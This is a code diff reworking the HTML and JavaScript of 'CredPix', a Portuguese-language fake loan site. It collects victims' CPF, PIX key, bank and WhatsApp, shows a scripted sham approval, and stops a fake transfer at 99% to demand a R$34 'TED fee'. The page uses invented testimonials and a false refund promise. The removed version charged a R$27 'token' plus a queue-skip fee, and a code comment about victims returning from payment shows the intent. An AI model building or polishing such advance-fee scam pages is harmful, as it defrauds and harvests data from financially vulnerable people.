@@ -3,206 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CredPix - Solução Financeira</title>
+    <title>CredPix - Solução Digital</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Open Sans', sans-serif; background: #4b00e0; }
-        .font-mont { font-family: 'Montserrat', sans-serif; }
+        body { font-family: 'Inter', sans-serif; background: #4b00e0; color: #1e293b; }
         .bg-app { background: linear-gradient(180deg, #6e2cf2 0%, #4b00e0 100%); min-height: 100vh; }
         .page { display: none; }
-        .page.active { display: block; animation: slideUp 0.4s ease-out; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .card { background: white; border-radius: 35px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3); }
-        .btn-main { background: #00f2ff; color: #000; font-weight: 900; transition: 0.3s; }
-        .btn-main:active { transform: scale(0.95); }
+        .page.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .card { background: white; border-radius: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .btn-target { background: #00f2ff; color: #000; font-weight: 800; border-radius: 18px; transition: 0.2s; }
+        .btn-target:active { transform: scale(0.96); }
+        .carousel-item { min-width: 100%; transition: 0.5s; }
     </style>
 </head>
 <body class="bg-app">
 
     <section id="step1" class="page active">
-        <div class="max-w-md mx-auto p-6 pb-20">
-            <header class="text-center py-10">
-                <h1 class="font-mont font-black text-4xl text-white italic tracking-tighter">CREDP<span class="text-cyan-400">IX</span></h1>
-                <p class="text-cyan-200 text-[10px] uppercase tracking-[4px] font-bold">Solução em 2 Minutos</p>
+        <div class="max-w-md mx-auto p-5 pb-10">
+            <header class="text-center py-8">
+                <h1 class="font-extrabold text-3xl text-white tracking-tighter italic uppercase">CREDP<span class="text-cyan-400">IX</span></h1>
+                <p class="text-cyan-200 text-[9px] uppercase tracking-[3px] font-semibold">Soluções Financeiras</p>
             </header>
 
-            <div class="card p-8 mb-8 text-center">
-                <h2 class="font-mont font-black text-2xl text-slate-800 leading-tight mb-6">Analise seu crédito agora de forma gratuita!</h2>
+            <h2 class="text-white text-2xl font-extrabold text-center leading-tight mb-8">O crédito que você precisa em poucos cliques.</h2>
+
+            <div class="overflow-hidden mb-8">
+                <div class="flex" id="carousel">
+                    <div class="carousel-item bg-white/10 border border-white/20 p-6 rounded-3xl text-center backdrop-blur-md">
+                        <span class="text-cyan-400 font-bold text-xs uppercase italic">Passo 01</span>
+                        <p class="text-white font-bold text-lg mt-1">Simule seu crédito</p>
+                        <p class="text-cyan-100 text-xs mt-2">Escolha o valor que cabe no seu bolso sem compromisso.</p>
+                    </div>
+                </div>
+                <div class="flex justify-center gap-2 mt-4">
+                    <div class="w-2 h-2 bg-white rounded-full"></div>
+                    <div class="w-2 h-2 bg-white/30 rounded-full"></div>
+                    <div class="w-2 h-2 bg-white/30 rounded-full"></div>
+                </div>
+            </div>
+
+            <div class="card p-7 mb-8">
                 <div class="space-y-4">
-                    <input type="text" id="nome_user" placeholder="Nome Completo" class="w-full p-4 bg-slate-100 rounded-2xl outline-none border-2 border-transparent focus:border-purple-500 font-bold">
-                    <input type="tel" id="cpf_user" placeholder="CPF" class="w-full p-4 bg-slate-100 rounded-2xl outline-none border-2 border-transparent focus:border-purple-500 font-bold">
-                    <input type="date" class="w-full p-4 bg-slate-100 rounded-2xl outline-none font-bold">
-                    <button onclick="nextStep(2)" class="w-full btn-main py-5 rounded-2xl shadow-xl uppercase font-mont italic">Verificar meu Limite</button>
+                    <input type="text" id="nome_user" placeholder="Nome Completo" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-cyan-400 font-semibold text-sm">
+                    <input type="tel" id="cpf_user" placeholder="CPF" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-cyan-400 font-semibold text-sm">
+                    <input type="date" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold text-sm">
+                    <button onclick="nextStep(2)" class="w-full btn-target py-5 uppercase italic text-sm shadow-lg shadow-cyan-500/20">Analisar Grátis</button>
                 </div>
             </div>
 
             <div class="space-y-4 mb-10">
-                <h3 class="text-white font-bold ml-4 uppercase text-xs tracking-widest">Depoimentos reais</h3>
-                
-                <div class="bg-white/10 p-4 rounded-3xl border border-white/20 flex gap-4 backdrop-blur-sm">
-                    <img src="https://randomuser.me/api/portraits/women/65.jpg" class="w-12 h-12 rounded-full border-2 border-cyan-400">
-                    <div>
-                        <p class="text-white font-bold text-sm">Regina Célia ⭐⭐⭐⭐⭐</p>
-                        <p class="text-cyan-100 text-[11px]">"O valor do token de 27 reais volta mesmo! Recebi meus 2.500 no PIX certinho."</p>
-                    </div>
+                <h3 class="text-white/50 font-bold text-[10px] uppercase tracking-widest ml-2">Depoimentos</h3>
+                <div class="bg-white/5 p-5 rounded-3xl border border-white/10">
+                    <p class="text-white font-bold text-sm">Maria Auxiliadora</p>
+                    <p class="text-white/70 text-xs mt-1">"Consegui resolver minhas contas pendentes em minutos. Muito prático!"</p>
                 </div>
-
-                <div class="bg-white/10 p-4 rounded-3xl border border-white/20 flex gap-4 backdrop-blur-sm">
-                    <img src="https://randomuser.me/api/portraits/men/44.jpg" class="w-12 h-12 rounded-full border-2 border-cyan-400">
-                    <div>
-                        <p class="text-white font-bold text-sm">José Antônio ⭐⭐⭐⭐⭐</p>
-                        <p class="text-cyan-100 text-[11px]">"Paguei pra pular a fila e valeu cada centavo, caiu em 2 minutos."</p>
-                    </div>
-                </div>
-
-                <div class="bg-white/10 p-4 rounded-3xl border border-white/20 flex gap-4 backdrop-blur-sm">
-                    <img src="https://randomuser.me/api/portraits/women/32.jpg" class="w-12 h-12 rounded-full border-2 border-cyan-400">
-                    <div>
-                        <p class="text-white font-bold text-sm">Maria Auxiliadora ⭐⭐⭐⭐⭐</p>
-                        <p class="text-cyan-100 text-[11px]">"Tenho score baixo e liberou 3 mil pra mim. Muito obrigada!"</p>
-                    </div>
+                <div class="bg-white/5 p-5 rounded-3xl border border-white/10">
+                    <p class="text-white font-bold text-sm">Antônio Ferreira</p>
+                    <p class="text-white/70 text-xs mt-1">"Fiz a ativação do TED conforme pedido e o dinheiro caiu certinho. Recomendo."</p>
                 </div>
             </div>
 
-            <footer class="bg-white/10 p-6 rounded-[40px] text-center border border-white/20">
-                <p class="text-white font-bold uppercase text-[10px] mb-2">CredPix Soluções Digitais</p>
-                <p class="text-cyan-200 text-[9px]">Av. Brigadeiro Faria Lima, 3477 - Itaim Bibi, São Paulo - SP</p>
-                <p class="text-cyan-200 text-[9px] mt-1">Contato: (11) 4003-8921 | CNPJ: 44.650.594/0001-30</p>
+            <footer class="text-center text-[9px] text-white/40 space-y-1">
+                <p class="font-bold">CREDPX SOLUÇÕES DIGITAIS</p>
+                <p>Av. Brigadeiro Faria Lima, 3477 - Itaim Bibi, São Paulo - SP</p>
+                <p>CNPJ: 44.650.594/0001-30 | (11) 4003-8921</p>
             </footer>
         </div>
     </section>
 
     <section id="step2" class="page">
-        <div class="flex flex-col items-center justify-center h-screen text-center p-10">
-            <div class="w-24 h-24 border-8 border-white/20 border-t-cyan-400 rounded-full animate-spin mb-8"></div>
-            <h2 id="loader-text" class="text-white font-mont font-black text-2xl uppercase italic">Analisando CPF...</h2>
+        <div class="flex flex-col items-center justify-center h-screen p-10">
+            <div class="w-16 h-16 border-4 border-white/10 border-t-cyan-400 rounded-full animate-spin"></div>
+            <p id="loader-text" class="text-white font-bold mt-6 uppercase italic tracking-widest text-xs">Analisando dados...</p>
         </div>
     </section>
 
-    <section id="step3" class="page p-6">
-        <div class="max-w-md mx-auto text-center py-10">
-            <div class="card p-10">
-                <h2 class="font-mont font-black text-2xl text-slate-800 italic uppercase mb-2">Quanto você precisa?</h2>
-                <p class="text-slate-400 text-xs mb-8">Arraste para selecionar seu limite:</p>
-                <p class="text-6xl font-black text-purple-600 font-mont mb-10">R$ <span id="val-range">2000</span></p>
-                <input type="range" min="2000" max="10000" step="500" value="2000" oninput="updateRange(this.value)" class="w-full h-4 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-purple-600 mb-10">
-                <button onclick="nextStep(4)" class="w-full btn-main py-5 rounded-2xl shadow-xl uppercase font-mont italic">Confirmar Valor</button>
-            </div>
-        </div>
-    </section>
-
-    <section id="step4" class="page p-6 text-center">
-        <div class="max-w-md mx-auto mt-20">
-            <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-green-500/50">
-                <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
-            </div>
-            <h2 class="text-white font-mont font-black text-4xl italic uppercase mb-2">Aprovado!</h2>
-            <p class="text-cyan-200 font-bold mb-10">Parabéns! Liberamos R$ <span class="chosen-val">2000</span> para você.</p>
-            <button onclick="nextStep(5)" class="w-full btn-main py-5 rounded-2xl shadow-xl uppercase font-mont italic">Ver Planos de Pagamento</button>
-        </div>
-    </section>
-
-    <section id="step5" class="page p-6">
-        <div class="max-w-md mx-auto text-center mt-10">
-            <h2 class="text-white font-mont font-black text-2xl uppercase mb-8">Escolha as Parcelas</h2>
-            <div class="grid gap-4 mb-8">
-                <button onclick="selectPlan('36x')" class="bg-white p-6 rounded-3xl border-4 border-transparent hover:border-cyan-400 text-left transition-all shadow-xl">
-                    <p class="text-xs font-bold text-slate-400 uppercase">36x de</p>
-                    <p class="text-3xl font-black text-slate-800 font-mont">R$ 58,33</p>
-                    <p class="text-[10px] text-green-600 font-bold">180 DIAS DE CARÊNCIA</p>
-                </button>
-                <button onclick="selectPlan('48x')" class="bg-white p-6 rounded-3xl border-4 border-transparent hover:border-cyan-400 text-left transition-all shadow-xl">
-                    <p class="text-xs font-bold text-slate-400 uppercase">48x de</p>
-                    <p class="text-3xl font-black text-slate-800 font-mont">R$ 44,12</p>
-                    <p class="text-[10px] text-green-600 font-bold">180 DIAS DE CARÊNCIA</p>
-                </button>
-            </div>
-        </div>
-    </section>
-
-    <section id="step6" class="page p-6">
+    <section id="step3" class="page p-5">
         <div class="max-w-md mx-auto card p-8 mt-10">
-            <h2 class="font-mont font-black text-xl text-center mb-6 italic uppercase">Dados de Recebimento</h2>
-            <div class="space-y-4">
-                <input type="text" id="chave_pix" placeholder="Sua Chave PIX" class="w-full p-4 bg-slate-100 rounded-2xl outline-none font-bold">
-                <select id="banco_user" class="w-full p-4 bg-slate-100 rounded-2xl outline-none font-bold">
-                    <option>Selecione seu Banco</option>
-                    <option>Nubank</option><option>Itaú</option><option>Caixa</option><option>Inter</option>
-                </select>
-                <input type="tel" id="whatsapp_user" placeholder="Seu WhatsApp com DDD" class="w-full p-4 bg-slate-100 rounded-2xl outline-none font-bold">
-                <button onclick="showSummary()" class="w-full btn-main py-5 rounded-2xl uppercase font-mont">Continuar</button>
-            </div>
+            <h2 class="font-extrabold text-xl mb-2 italic uppercase">Quanto deseja?</h2>
+            <p class="text-slate-400 text-[11px] mb-8">Arraste para selecionar o valor do crédito:</p>
+            <p class="text-5xl font-extrabold text-indigo-600 mb-8">R$ <span id="val-range">2000</span></p>
+            <input type="range" min="2000" max="10000" step="500" value="2000" oninput="updateRange(this.value)" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer accent-indigo-600 mb-10">
+            <button onclick="approveValue()" class="w-full btn-target py-5 uppercase italic text-sm">Confirmar Valor</button>
         </div>
     </section>
 
-    <section id="step7" class="page p-6">
-        <div class="max-w-md mx-auto card p-8 mt-10">
-            <h2 class="font-mont font-black text-xl text-center mb-6 uppercase italic">Resumo do Pedido</h2>
-            <div class="bg-slate-50 p-6 rounded-3xl mb-8 border-2 border-slate-100">
-                <p class="text-[10px] font-bold text-slate-400 uppercase mb-4">Informações do Contrato:</p>
-                <div class="space-y-3">
-                    <div class="flex justify-between"><span class="text-xs font-bold">Limite:</span><span class="text-xs font-black">R$ <span class="chosen-val">2000</span></span></div>
-                    <div class="flex justify-between"><span class="text-xs font-bold">Parcelas:</span><span id="res-parcelas" class="text-xs font-black">36x</span></div>
-                    <div class="flex justify-between"><span class="text-xs font-bold">Banco:</span><span id="res-banco" class="text-xs font-black">Inter</span></div>
-                </div>
-            </div>
-            <button onclick="nextStep(8)" class="w-full btn-main py-5 rounded-2xl font-mont">CONCORDAR E GERAR PIX</button>
-        </div>
-    </section>
-
-    <section id="step8" class="page p-6">
-        <div class="max-w-md mx-auto card p-8 mt-10">
-            <h2 class="font-mont font-black text-xl text-center mb-4 italic">TERMO DE ADESÃO</h2>
-            <div class="h-48 overflow-y-scroll bg-slate-50 p-4 rounded-2xl text-[10px] text-slate-500 mb-6 border font-bold">
-                <p>1. O CredPix atua como integrador oficial...</p>
-                <p>2. A liberação do PIX requer a ativação do Token de Saque...</p>
-                <p>3. O valor de R$ 27,00 é uma taxa de emissão técnica...</p>
-                <p>4. O estorno do valor ocorre em até 24h pós-saque...</p>
-                <p>5. Carência de 180 dias garantida...</p>
-                <p>6. Autorizo a consulta de dados cadastrais...</p>
-                <p>7. Transferência imediata após compensação...</p>
-                <p>8. Contrato regido pelas leis vigentes...</p>
-                <p>9. Taxa de prioridade opcional para pular fila...</p>
-                <p>10. Aceite digital com valor jurídico.</p>
-            </div>
-            <button onclick="startProgress()" class="w-full bg-green-500 text-white font-black py-5 rounded-2xl font-mont shadow-lg">ACEITAR E RECEBER</button>
-        </div>
-    </section>
-
-    <section id="step9" class="page p-6">
+    <section id="step4" class="page p-5">
         <div class="max-w-md mx-auto text-center mt-20">
-            <h2 class="text-white font-mont font-black text-2xl uppercase italic mb-10">Processando PIX...</h2>
-            <div class="w-full bg-white/20 h-8 rounded-full overflow-hidden border-2 border-white/50 mb-4">
-                <div id="progress-bar" class="bg-green-500 h-full w-0 transition-all duration-300"></div>
+            <div id="check-icon" class="hidden w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-green-500/30">
+                <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
             </div>
-            <p id="progress-text" class="text-cyan-200 font-bold text-xs uppercase tracking-widest">Iniciando (0%)</p>
-
-            <div id="modal-taxa" class="hidden fixed inset-0 bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
-                <div class="bg-white rounded-[40px] p-8 text-center max-w-sm animate-bounce">
-                    <div class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-                    </div>
-                    <h3 class="font-mont font-black text-xl text-slate-800 uppercase italic mb-4 leading-tight">Transferência<br>Interrompida!</h3>
-                    <p class="text-slate-500 text-xs font-bold leading-relaxed mb-8">Seu Token de Ativação não foi detectado. Para liberar o saque de R$ <span class="chosen-val">2000</span>, emita sua assinatura agora.</p>
-                    <button onclick="window.location.href='https://checkout.exemplo.com/pague-27'" class="w-full bg-red-600 text-white font-black py-5 rounded-2xl shadow-xl uppercase font-mont italic">Ativar Token (R$ 27,00)</button>
-                </div>
+            <h2 id="approve-title" class="text-white font-extrabold text-3xl uppercase italic mb-2 tracking-tighter">Processando...</h2>
+            <p id="approve-desc" class="text-cyan-200 text-sm font-semibold">Validando limite pré-aprovado.</p>
+            <div id="approve-btn" class="hidden mt-10">
+                <button onclick="nextStep(5)" class="w-full btn-target py-5 uppercase italic text-sm">Ver Opções de Parcelas</button>
             </div>
         </div>
     </section>
 
-    <section id="step10" class="page p-6">
-        <div class="max-w-md mx-auto text-center mt-10">
-            <div class="card p-10">
-                <h2 class="font-mont font-black text-xl uppercase mb-6 italic text-slate-800">Ordem de Pagamento na Fila</h2>
-                <div class="bg-slate-100 p-10 rounded-[40px] mb-8">
-                    <p class="text-[10px] font-bold text-slate-400 uppercase mb-2">Sua Posição:</p>
-                    <p class="text-7xl font-black text-purple-600 font-mont italic">#<span id="fila-num">76</span></p>
-                </div>
-                <div class="bg-amber-50 border-2 border-amber-200 p-6 rounded-3xl">
-                    <p class="text-amber-800 font-black text-xs uppercase mb-2">🚀 RECEBER EM 2 MINUTOS?</p>
-                    <p class="text-[10px] text-amber-600 font-bold mb-6">Pule para a 1ª posição da fila ativando o Fluxo Prioritário.</p>
-                    <button onclick="window.location.href='https://checkout.exemplo.com/pague-34'" class="w-full bg-amber-500 text-white font-black py-4 rounded-2xl shadow-lg uppercase font-mont italic text-sm">Pular Fila (R$ 34,00)</button>
+    <section id="step5" class="page p-5">
+        <div class="max-w-md mx-auto mt-10">
+            <h2 class="text-white font-extrabold text-xl text-center uppercase italic mb-8">Plano de Pagamento</h2>
+            <div class="grid gap-4">
+                <button onclick="selectPlan('36x')" class="card p-6 text-left hover:ring-4 ring-cyan-400 transition-all">
+                    <p class="text-[10px] font-bold text-slate-400 uppercase">36 Parcelas de</p>
+                    <p class="text-2xl font-extrabold text-slate-800">R$ 58,33</p>
+                    <p class="text-[10px] text-green-500 font-bold mt-2">CARÊNCIA DE 180 DIAS</p>
+                </button>
+                <button onclick="selectPlan('48x')" class="card p-6 text-left hover:ring-4 ring-cyan-400 transition-all">
+                    <p class="text-[10px] font-bold text-slate-400 uppercase">48 Parcelas de</p>
+                    <p class="text-2xl font-extrabold text-slate-800">R$ 44,12</p>
+                    <p class="text-[10px] text-green-500 font-bold mt-2">CARÊNCIA DE 180 DIAS</p>
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <section id="step6" class="page p-5">
+        <div class="max-w-md mx-auto card p-8 mt-10">
+            <h2 class="font-extrabold text-lg text-center mb-6 uppercase italic">Dados Bancários</h2>
+            <div class="space-y-4 text-sm">
+                <input type="text" id="pix_key" placeholder="Sua Chave PIX" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold">
+                <select id="banco_user" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold">
+                    <option>Selecione seu Banco</option>
+                    <option>Nubank</option><option>Inter</option><option>Caixa</option><option>Bradesco</option>
+                </select>
+                <input type="tel" placeholder="WhatsApp com DDD" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold">
+                <button onclick="showSummary()" class="w-full btn-target py-5 uppercase italic mt-4">Próximo Passo</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="step7" class="page p-5">
+        <div class="max-w-md mx-auto card p-8 mt-10 text-center">
+            <h2 class="font-extrabold text-lg uppercase mb-6 italic">Confirmar Dados</h2>
+            <div class="bg-indigo-50 p-6 rounded-3xl text-left space-y-3 mb-8">
+                <p class="text-[11px] font-semibold flex justify-between"><span>LIMITE:</span> <span class="text-indigo-600">R$ <span class="chosen-val">2000</span></span></p>
+                <p class="text-[11px] font-semibold flex justify-between"><span>PLANO:</span> <span id="res-plan" class="text-indigo-600">36x</span></p>
+                <p class="text-[11px] font-semibold flex justify-between"><span>BANCO:</span> <span id="res-banco" class="text-indigo-600">Nubank</span></p>
+            </div>
+            <button onclick="nextStep(8)" class="w-full btn-target py-5 uppercase italic">Concluir Agora</button>
+        </div>
+    </section>
+
+    <section id="step8" class="page p-5">
+        <div class="max-w-md mx-auto card p-8 mt-10">
+            <h2 class="font-extrabold text-lg text-center mb-4 italic uppercase tracking-tighter">Termo de Ativação</h2>
+            <div class="h-40 overflow-y-scroll bg-slate-50 p-4 rounded-2xl text-[10px] font-semibold text-slate-500 mb-6 leading-relaxed">
+                <p>1. A liberação do crédito CredPix está condicionada à ativação da Taxa de Transferência Interbancária (TED).</p>
+                <p>2. O valor de R$ 34,00 é tarifário e exclusivo para custos de remessa instantânea.</p>
+                <p>3. O estorno da taxa é garantido e será creditado junto com o valor principal em até 10 minutos após a confirmação.</p>
+                <p>4. Fica estabelecida a carência de 180 dias...</p>
+            </div>
+            <button onclick="startTransfer()" class="w-full btn-target py-5 uppercase italic">Aceitar e Receber</button>
+        </div>
+    </section>
+
+    <section id="step9" class="page p-5">
+        <div class="max-w-md mx-auto text-center mt-20">
+            <h2 class="text-white font-extrabold text-xl uppercase italic mb-8">Enviando seu PIX...</h2>
+            <div class="w-full bg-white/10 h-6 rounded-full overflow-hidden mb-4">
+                <div id="progress-bar" class="bg-cyan-400 h-full w-0 transition-all duration-300"></div>
+            </div>
+            <p id="progress-text" class="text-cyan-100 text-[10px] font-bold uppercase tracking-widest">Iniciando (0%)</p>
+
+            <div id="modal-error" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-6 z-50">
+                <div class="bg-white rounded-[32px] p-8 text-center max-w-sm">
+                    <div class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                    </div>
+                    <h3 class="font-extrabold text-xl mb-4 italic leading-tight">ERRO NA TRANSFERÊNCIA</h3>
+                    <p class="text-slate-500 text-xs font-semibold leading-relaxed mb-8">
+                        Identificamos que a <b class="text-slate-800">Taxa de TED (Transferência de Crédito)</b> não foi processada. Para liberar o saldo de R$ <span class="chosen-val">2000</span>, realize o pagamento obrigatório de R$ 34,00.
+                    </p>
+                    <button onclick="window.location.href='https://checkout.exemplo.com/pague-34'" class="w-full btn-target py-5 uppercase italic text-sm">Pagar Taxa de TED</button>
                 </div>
             </div>
         </div>
@@ -218,13 +194,7 @@
             window.scrollTo(0,0);
             
             if(step === 2) {
-                let phrases = ["Buscando CPF...", "Verificando Score...", "Liberando Limite..."];
-                let i = 0;
-                let interval = setInterval(() => {
-                    document.getElementById('loader-text').innerText = phrases[i];
-                    i++;
-                    if(i === phrases.length) { clearInterval(interval); setTimeout(() => nextStep(3), 800); }
-                }, 1200);
+                setTimeout(() => nextStep(3), 3000);
             }
         }
 
@@ -234,42 +204,40 @@
             document.querySelectorAll('.chosen-val').forEach(el => el.innerText = val);
         }
 
-        function selectPlan(plan) {
-            selectedPlan = plan;
-            nextStep(6);
+        function approveValue() {
+            nextStep(4);
+            setTimeout(() => {
+                document.getElementById('approve-title').innerText = "LIMITADO APROVADO!";
+                document.getElementById('approve-desc').innerHTML = "Parabéns! R$ " + chosenVal + " liberados para saque imediato.";
+                document.getElementById('check-icon').classList.remove('hidden');
+                document.getElementById('approve-btn').classList.remove('hidden');
+            }, 3500);
         }
 
+        function selectPlan(p) { selectedPlan = p; nextStep(6); }
+
         function showSummary() {
-            document.getElementById('res-parcelas').innerText = selectedPlan;
+            document.getElementById('res-plan').innerText = selectedPlan;
             document.getElementById('res-banco').innerText = document.getElementById('banco_user').value;
             nextStep(7);
         }
 
-        function startProgress() {
+        function startTransfer() {
             nextStep(9);
             let width = 0;
-            let bar = document.getElementById('progress-bar');
-            let text = document.getElementById('progress-text');
-            let interval = setInterval(() => {
+            const bar = document.getElementById('progress-bar');
+            const text = document.getElementById('progress-text');
+            const interval = setInterval(() => {
                 if(width >= 99) {
                     clearInterval(interval);
-                    document.getElementById('modal-taxa').classList.remove('hidden');
-                    text.innerText = "BLOQUEADO (99%)";
+                    document.getElementById('modal-error').classList.remove('hidden');
+                    text.innerText = "TRANSFERÊNCIA BLOQUEADA (99%)";
                 } else {
                     width++;
                     bar.style.width = width + '%';
-                    text.innerText = "Transferindo (" + width + "%)";
+                    text.innerText = "Enviando para " + document.getElementById('res-banco').innerText + " (" + width + "%)";
                 }
-            }, 60);
-        }
-
-        // Simulação da fila diminuindo (Chame isso quando o cara voltar do pgmto de 27)
-        function decreaseFila() {
-            let num = 76;
-            let interval = setInterval(() => {
-                if(num <= 3) { clearInterval(interval); }
-                else { num--; document.getElementById('fila-num').innerText = num; }
-            }, 2000);
+            }, 70);
         }
     </script>
 </body>
